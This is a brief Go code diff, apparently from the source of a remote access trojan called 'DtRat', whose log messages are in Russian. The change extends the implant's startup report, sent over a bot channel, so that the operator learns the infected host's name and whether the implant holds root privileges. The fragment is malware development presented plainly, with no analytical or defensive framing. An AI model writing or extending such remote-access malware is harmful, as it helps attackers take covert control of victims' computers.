@@ -22,7 +22,7 @@ func (r *Rat) Start() {
 	dlog.GLogger.Info("Запуск ратника")
 	r.Bot.Start()
 	go r.commandHandling()
-	r.Bot.Send("DtRat Запущен!\n\nХост:%s", r.Config.General.HostName)
+	r.Bot.Send("DtRat Запущен!\n\nХост: %s\nroot: %t", r.Config.General.HostName, r.Engine.Info.IsRoot())
 }
 
 func (r *Rat) commandHandling() error {
